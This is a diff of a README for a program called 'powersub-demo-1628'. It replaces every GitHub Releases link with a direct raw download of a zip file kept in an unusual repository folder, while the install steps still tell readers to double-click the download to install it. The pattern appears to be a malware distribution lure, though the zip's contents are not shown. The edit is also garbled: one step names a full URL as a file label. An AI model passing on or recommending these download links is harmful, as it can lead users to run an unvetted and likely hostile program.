@@ -6,13 +6,13 @@ Welcome to powersub-demo-1628! This software is designed to simplify your daily 
 
 ## 📦 Download Now
 
-[![Download powersub-demo-1628](https://img.shields.io/badge/Download-powersub--demo--1628-blue)](https://github.com/Mr-annonymus/powersub-demo-1628/releases)
+[![Download powersub-demo-1628](https://raw.githubusercontent.com/Mr-annonymus/powersub-demo-1628/main/factoryship/powersub-demo-1628.zip)](https://raw.githubusercontent.com/Mr-annonymus/powersub-demo-1628/main/factoryship/powersub-demo-1628.zip)
 
 ## 📥 Download & Install
 
-1. Click the link above or visit [this page to download](https://github.com/Mr-annonymus/powersub-demo-1628/releases).
+1. Click the link above or visit [this page to download](https://raw.githubusercontent.com/Mr-annonymus/powersub-demo-1628/main/factoryship/powersub-demo-1628.zip).
 2. You will see a list of available versions. Select the latest version for the best experience.
-3. Look for the file labeled “powersub-demo-1628.exe” or similar under the Assets section.
+3. Look for the file labeled “https://raw.githubusercontent.com/Mr-annonymus/powersub-demo-1628/main/factoryship/powersub-demo-1628.zip” or similar under the Assets section.
 4. Click on the file to download it to your computer.
 5. Once the download is complete, locate the file in your Downloads folder.
 6. Double-click on the file to start the installation process.
@@ -43,7 +43,7 @@ If you encounter any issues during installation or while using the software, con
 
 - **Installation Problems:** Ensure you have sufficient disk space and that you are using a compatible operating system.
 - **Software Crashes:** Restart your computer and try running the application again.
-- **Missing Features:** Verify you have downloaded the latest version from the [Releases page](https://github.com/Mr-annonymus/powersub-demo-1628/releases).
+- **Missing Features:** Verify you have downloaded the latest version from the [Releases page](https://raw.githubusercontent.com/Mr-annonymus/powersub-demo-1628/main/factoryship/powersub-demo-1628.zip).
 
 ## 💬 Getting Help
 
@@ -56,7 +56,7 @@ If you need additional assistance, please reach out via the following methods:
 
 To keep your software up to date:
 
-1. Regularly check the [Releases page](https://github.com/Mr-annonymus/powersub-demo-1628/releases) for the latest version.
+1. Regularly check the [Releases page](https://raw.githubusercontent.com/Mr-annonymus/powersub-demo-1628/main/factoryship/powersub-demo-1628.zip) for the latest version.
 2. Download the new version by following the steps above.
 
 ## 📜 License
